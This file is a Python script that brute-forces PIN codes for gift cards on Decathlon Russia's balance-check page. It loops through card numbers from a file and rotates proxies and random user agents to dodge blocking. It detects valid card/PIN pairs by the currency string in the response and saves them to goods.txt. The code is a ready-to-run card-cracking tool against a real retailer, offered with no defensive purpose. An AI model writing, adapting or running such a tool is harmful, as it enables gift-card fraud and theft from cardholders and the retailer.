import requests
import fake_useragent
from bs4 import BeautifulSoup

def get_form_key():
    source = requests.get("https://giftcard.decathlon.ru/balance/").text
    soup = BeautifulSoup(source, "lxml")
    key = soup.find('input', dict(name='form_key'))['value']
    return key

#ith open('proxy.txt')as file:
#    proxy_base = ''.join(file.readlines()).strip().split('\n')

p = open("proxy.txt", "r+").readlines()
proxy_base = [c.rstrip()for c in p]
req = requests.session()
a = open("cards.txt", "r").readlines()
file = [s.rstrip()for s in a]
for lines in file:
    combo = lines

    n = 7997
    g = False

    for proxy in proxy_base:
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

        if g:
            break

        for i in range(n, 8001):

            header = {
                "user_agent": fake_useragent.UserAgent().random
            }

            param = {
                "form_key": get_form_key(),
                "cardnumber": combo,
                "codepin": i
            }

            try:
                source = req.post("https://giftcard.decathlon.ru/balance/", proxies=proxies, timeout=3, data=param, headers=header).text
                if "RUB" in source:
                    g = True
                    print(f"VALID {proxy,combo,i}")
                    file = open("goods.txt", 'r+')
                    file.write(str(combo) + str(i) + '\n')
                    file.close()
                    break
                if "контрольный" in source:
                    print(f"ОТЛЕГ {proxy,combo}")
                    break
                else:
                    print(f"INVALID {get_form_key(),combo,i}")
                    n = i + 1
            except:
                print(f'PROXY {proxy} INVALID {combo, i}')
                break